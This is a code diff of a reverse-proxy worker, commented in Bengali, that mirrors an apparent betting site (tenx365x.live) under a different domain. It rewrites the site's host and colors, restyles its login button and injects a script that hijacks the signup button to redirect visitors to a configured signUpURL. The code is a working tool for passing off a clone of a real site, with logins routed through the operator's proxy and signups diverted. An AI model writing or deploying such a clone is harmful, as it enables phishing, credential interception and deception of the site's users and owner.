@@ -1,5 +1,5 @@
 /**
- * Professional Reverse Proxy Worker
+ * Professional Reverse Proxy Worker - Final Stable Version
  * Target: tenx365x.live
  */
 
@@ -33,41 +33,35 @@ async function handleRequest(request) {
   if (contentType.includes('text/html') || contentType.includes('text/css') || contentType.includes('application/javascript')) {
     let body = await response.text();
 
-    // ১. গ্লোবাল ডোমেইন এবং হেক্স কালার রিপ্লেসমেন্ট
+    // ১. গ্লোবাল ডোমেইন এবং কালার রিপ্লেসমেন্ট
     body = body.replace(new RegExp(targetHost, 'g'), actualHost);
     body = body.replace(new RegExp(oldColor, 'gi'), myColor);
-    body = body.replace(/%2314805E/gi, '%2356BBD9'); // URL Encoded কালার রিপ্লেসমেন্ট
+    body = body.replace(/%2314805E/gi, '%2356BBD9');
 
     if (contentType.includes('text/html')) {
-      // ২. কাস্টম CSS (ডিজাইন এবং Play Now এর হেলানো শেপ ঠিক করার জন্য)
       const customStyles = `
       <style>
-        /* হেডার প্রিমিয়াম ডার্ক লিনিয়ার গ্রেডিয়েন্ট */
-        header, .header-top, [class*="header"] {
+        /* হেডার প্রিমিয়াম ডার্ক গ্রেডিয়েন্ট */
+        header, .header-top {
           background: linear-gradient(180deg, #252525 0%, #000000 100%) !important;
           border-bottom: 0.5px solid ${myColor}44 !important;
         }
 
-        /* লগইন বাটন - সলিড ডিজাইন উইথ প্রিমিয়াম আইকন */
-        .login-index.ui-link, .login-btn {
+        /* লগইন বাটন - সলিড ডিজাইন উইথ আইকন */
+        .login-index.ui-link {
           background: ${myColor} !important;
           color: #ffffff !important;
-          border: none !important;
           border-radius: 4px !important;
           padding: 6px 14px !important;
           display: inline-flex !important;
           align-items: center !important;
           justify-content: center !important;
           font-weight: bold !important;
-          text-decoration: none !important;
         }
-
-        /* লগইন বাটনের বামে মানুষের (User) আইকন */
         .login-index.ui-link::before {
           content: '';
           display: inline-block;
-          width: 15px;
-          height: 15px;
+          width: 15px; height: 15px;
           margin-right: 6px;
           background-color: white;
           -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E") no-repeat center;
@@ -82,55 +76,52 @@ async function handleRequest(request) {
           color: white !important;
           border: 1.5px solid ${myColor} !important;
           border-radius: 4px !important;
-          padding: 6px 14px !important;
-          text-decoration: none !important;
+          padding: 5px 14px !important;
           font-weight: bold !important;
-          align-items: center !important;
-          justify-content: center !important;
           margin-right: 8px;
         }
 
-        /* Play Now এর বাম দিকের হেলানো (Slanted) ডিজাইন তৈরি */
-        dd {
-          background-image: none !important; /* পুরনো ইমেজ মুছে দেওয়া হলো */
-          background-color: ${myColor} !important; /* আপনার কালার দেওয়া হলো */
-          clip-path: polygon(20% 0, 100% 0, 100% 100%, 0 100%) !important; /* CSS দিয়ে হেলানো শেপ তৈরি */
+        /* সমাধান ১: শুধুমাত্র হোমপেজের "Play Now" এর জন্য হেলানো ডিজাইন */
+        /* এখানে `.marketbox` ক্লাস ব্যবহার করে নির্দিষ্ট করা হয়েছে */
+        .marketbox dd, .game-list dd {
+          background-image: none !important;
+          background-color: ${myColor} !important;
+          clip-path: polygon(15% 0, 100% 0, 100% 100%, 0 100%) !important;
           padding-left: 10px !important;
         }
 
-        /* অন্যান্য যেকোনো সবুজের অবশিষ্টাংশ রিমুভ */
-        [style*="background-color: ${oldColor}"], 
-        [style*="background: ${oldColor}"],
-        .play-now-btn, .ui-btn-active {
+        /* সমাধান ২: ভেতরের পেইজে স্কোরবোর্ডের রঙ পরিবর্তন */
+        /* এখানে `.odds-box` ক্লাস দিয়ে নির্দিষ্ট করা হয়েছে */
+        .odds-box, .back-cell, [class*="back-"] {
           background-color: ${myColor} !important;
-          background: ${myColor} !important;
         }
-
-        svg path[fill="${oldColor}"], svg [fill="${oldColor}"] {
-          fill: ${myColor} !important;
+        .odds-box span, .odds-box .odds, .back-cell span {
+          color: #000 !important; /* লেখার রঙ কালো করা হলো যেন দেখা যায় */
+        }
+        
+        /* সমাধান ৩: ইন-প্লে লিস্টের ভাঙা ডিজাইন ঠিক করা */
+        .match-info, .ui-block-a, .ui-block-b, .match-row {
+            background: transparent !important; /* অতিরিক্ত রঙ মুছে দেওয়া হলো */
+        }
+        
+        /* বাকি সব সবুজ কালারকে আপনার কালার করা */
+        .ui-btn-active, .active {
+            background: ${myColor} !important;
         }
       </style>
       `;
       body = body.replace('</head>', `${customStyles}</head>`);
 
-      // ৩. সাইন আপ বাটন ফোর্স রিডাইরেক্ট (জাভাস্ক্রিপ্ট ইনজেকশন)
-      // সাইট নিজস্ব ইভেন্ট দিয়ে লিংক ব্লক করে দেয়, তাই এটা দিয়ে ফোর্স রিডাইরেক্ট করা হলো
       const forceRedirectScript = `
       <script>
         document.addEventListener("DOMContentLoaded", function() {
-          const signupButtons = document.querySelectorAll('#signupButton, .btn-signup, a[href*="Register"], a[href*="SignUp"]');
-          
-          signupButtons.forEach(button => {
-            button.href = "${signUpURL}"; // লিংক চেঞ্জ
-            button.target = "_self";
-            
-            // ক্লিক করলে যেন অন্য কোনো ইভেন্ট কাজ না করে সরাসরি আপনার লিংকে যায়
-            button.addEventListener("click", function(e) {
+          const signupButton = document.querySelector('#signupButton, .btn-signup');
+          if (signupButton) {
+            signupButton.onclick = function(e) {
               e.preventDefault();
-              e.stopPropagation();
               window.location.href = "${signUpURL}";
-            }, true);
-          });
+            };
+          }
         });
       </script>
       `;
